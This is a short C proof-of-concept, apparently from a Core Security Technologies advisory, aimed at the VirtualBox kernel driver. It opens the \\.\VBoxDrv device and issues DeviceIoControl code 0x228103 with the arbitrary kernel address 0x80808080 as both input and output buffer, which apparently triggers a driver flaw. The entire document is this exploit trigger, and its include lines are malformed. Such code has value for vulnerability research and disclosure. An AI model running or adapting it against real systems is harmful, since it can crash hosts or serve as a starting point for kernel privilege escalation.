/-----------

// Author:       Anibal Sacco (aLS)
// Contact:      anibal.sacco@coresecurity.com
//           anibal.sacco@gmail.com
// Organization: Core Security Technologies

#include <windows.h/>
#include <stdio.h/>

int main(int argc, char **argv)
{
  HANDLE   hDevice;
  DWORD    cb;
  char     szDevice[] = "\\\\.\\VBoxDrv";

  if ( (hDevice = CreateFileA(szDevice,
                          GENERIC_READ|GENERIC_WRITE,
                          0,
                          0,
                          OPEN_EXISTING,
                          0,
                          NULL) ) != INVALID_HANDLE_VALUE )
  {
    printf("Device %s succesfully opened!\n", szDevice);
  }
  else
  {
    printf("Error: Error opening device %s\n",szDevice);
  }

  cb = 0;
  if (!DeviceIoControl(hDevice,
        0x228103,
        (LPVOID)0x80808080,0,
        (LPVOID)0x80808080,0x0,
        &cb,
        NULL))
  {
    printf("Error in DeviceIo ... bytes returned %#x\n",cb);
  }
}
